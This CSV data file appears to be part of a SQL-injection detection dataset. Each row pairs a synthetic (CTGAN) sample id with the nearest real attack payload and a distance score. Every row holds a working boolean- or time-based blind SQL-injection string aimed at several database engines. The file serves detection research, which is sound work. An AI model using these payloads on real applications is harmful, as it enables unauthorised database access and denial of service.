id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000413,attack,boolean,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001288,4.169865692457197
CTGAN_000414,attack,boolean,"-1597"" where 5933  =  5933 or 3038  =  3038",nearest_attack_euclidean,R000907,8.445921249315921
CTGAN_000415,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,4.244461349646553
CTGAN_000416,attack,boolean,"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",nearest_attack_euclidean,R001701,4.8932446958842695
CTGAN_000417,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R003286,7.154272907417459
CTGAN_000418,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002520,5.297440161051259
CTGAN_000419,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R001913,4.919955578227497
CTGAN_000420,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R003026,4.593319305775394
CTGAN_000421,attack,boolean,"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003086,6.04012724853735
CTGAN_000422,attack,boolean,admin' or '1'  =  '1'--,nearest_attack_euclidean,R000171,10.108334702676819
CTGAN_000423,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002761,5.17659650100811
CTGAN_000424,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'zspf'  =  'zspf",nearest_attack_euclidean,R001626,6.624221596614241
CTGAN_000425,attack,boolean,1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R002730,4.732882346451035
CTGAN_000426,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R001495,6.033134663031508
CTGAN_000427,attack,boolean,"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000513,7.512741863728071
CTGAN_000428,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,4.859108094677605
CTGAN_000429,attack,boolean,"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",nearest_attack_euclidean,R003212,4.971792775094685
CTGAN_000430,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,7.44900657834487
CTGAN_000431,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,4.802993821827228
CTGAN_000432,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R003020,3.960770594781657
CTGAN_000433,attack,boolean,"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",nearest_attack_euclidean,R001874,5.352918720841603
CTGAN_000434,attack,boolean,"1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R002864,5.875944652032401
CTGAN_000435,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",nearest_attack_euclidean,R003472,5.557390643250145
CTGAN_000436,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001961,4.6176741245383655
CTGAN_000437,attack,boolean,-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,nearest_attack_euclidean,R000335,5.577090007873926
CTGAN_000438,attack,boolean,-9331' or   (  4519  =  2912  )  *2912 and 'rddk'  =  'rddk,nearest_attack_euclidean,R001710,5.6114747213316205
CTGAN_000439,attack,boolean,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,nearest_attack_euclidean,R003191,4.803382313871266
CTGAN_000440,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,5.678015388712342
CTGAN_000441,attack,boolean,"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",nearest_attack_euclidean,R001371,8.691246628517689
CTGAN_000442,attack,boolean,"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",nearest_attack_euclidean,R000609,6.020016647727121
CTGAN_000443,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",nearest_attack_euclidean,R001624,5.727957874588804
CTGAN_000444,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R003160,3.694791173457145
CTGAN_000445,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R002399,5.537635734268317
CTGAN_000446,attack,boolean,"1""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002620,6.341585675107368
CTGAN_000447,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk",nearest_attack_euclidean,R003554,4.761964459646835
CTGAN_000448,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R003133,5.078978353945408
CTGAN_000449,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R003218,5.795454994708774
CTGAN_000450,attack,boolean,"1' where 4417  =  4417 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001112,6.055706659369841
CTGAN_000451,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000858,4.623757586922699
CTGAN_000452,attack,boolean,"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R002117,5.024440703562759
CTGAN_000453,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001937,5.964531683957226
CTGAN_000454,attack,boolean,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',nearest_attack_euclidean,R002016,5.764031713398847
CTGAN_000455,attack,boolean,"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003275,6.260703378794808
CTGAN_000456,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R001133,4.279917025011488
CTGAN_000457,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R001580,3.726324293064379
CTGAN_000458,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.131668027860965
CTGAN_000459,attack,boolean,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",nearest_attack_euclidean,R000539,5.909694168880189
CTGAN_000460,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",nearest_attack_euclidean,R001470,5.417279216681286
CTGAN_000461,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R000982,6.274204091770353
CTGAN_000462,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,5.667009808512344
CTGAN_000463,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,6.344651515069115
CTGAN_000464,attack,boolean,-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,nearest_attack_euclidean,R002956,6.613088181577289
CTGAN_000465,attack,boolean,"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",nearest_attack_euclidean,R001057,6.1465314381647005
CTGAN_000466,attack,boolean,"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",nearest_attack_euclidean,R001482,6.235875634427843
CTGAN_000467,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000068,4.03020717163792
CTGAN_000468,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",nearest_attack_euclidean,R001223,5.363541103658349
CTGAN_000469,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000834,7.171670205255097
CTGAN_000470,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003338,4.301064555805418
CTGAN_000471,attack,boolean,"1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --",nearest_attack_euclidean,R001199,5.24942994154541
CTGAN_000472,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000731,3.6068440864355753
CTGAN_000473,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,6.576128663343092
CTGAN_000474,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R002790,4.752105241571112
CTGAN_000475,attack,boolean,"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",nearest_attack_euclidean,R003533,4.847675954445949
CTGAN_000476,attack,boolean,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000684,6.503160064457409
CTGAN_000477,attack,boolean,"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R002466,8.253713802312102
CTGAN_000478,attack,boolean,"1  )   and make_set  (  8403  =  8403,8899  )   and   (  9761  =  9761",nearest_attack_euclidean,R002038,5.198642542728153
CTGAN_000479,attack,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",nearest_attack_euclidean,R002049,4.398599797654668
CTGAN_000480,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,4.931441704731531
CTGAN_000481,attack,boolean,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",nearest_attack_euclidean,R002641,4.528656058968343
CTGAN_000482,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002435,6.078805942592197
CTGAN_000483,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000858,4.985528555480116
CTGAN_000484,attack,boolean,1'  )   rlike   (  select   (  case when   (  9308  =  2540  )   then 1 else 0x28 end   )    )    and   (  'rghd'  =  'rghd,nearest_attack_euclidean,R003289,4.712301705932273
CTGAN_000485,attack,boolean,"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R001052,4.939455673299325
CTGAN_000486,attack,boolean,"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002161,8.742158736038446
CTGAN_000487,attack,boolean,"1%'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000970,6.191412686071188
CTGAN_000488,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002818,6.2725009183383635
CTGAN_000489,attack,boolean,"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002828,4.775653447803413
CTGAN_000490,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002761,4.571771810544587
CTGAN_000491,attack,boolean,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,nearest_attack_euclidean,R002293,3.5888957264577934
CTGAN_000492,attack,boolean,"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",nearest_attack_euclidean,R001471,5.720262220287357
CTGAN_000493,attack,boolean,1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,nearest_attack_euclidean,R001127,5.163916331888847
CTGAN_000494,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",nearest_attack_euclidean,R003070,4.819229198515538
CTGAN_000495,attack,boolean,"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003182,6.472921124878663
CTGAN_000496,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003525,6.4212938944391
CTGAN_000497,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,4.879695342267931
CTGAN_000498,attack,boolean,"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",nearest_attack_euclidean,R001892,7.059337133138926
CTGAN_000499,attack,boolean,"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",nearest_attack_euclidean,R001874,6.630494342584121
CTGAN_000500,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000512,5.198072070571621
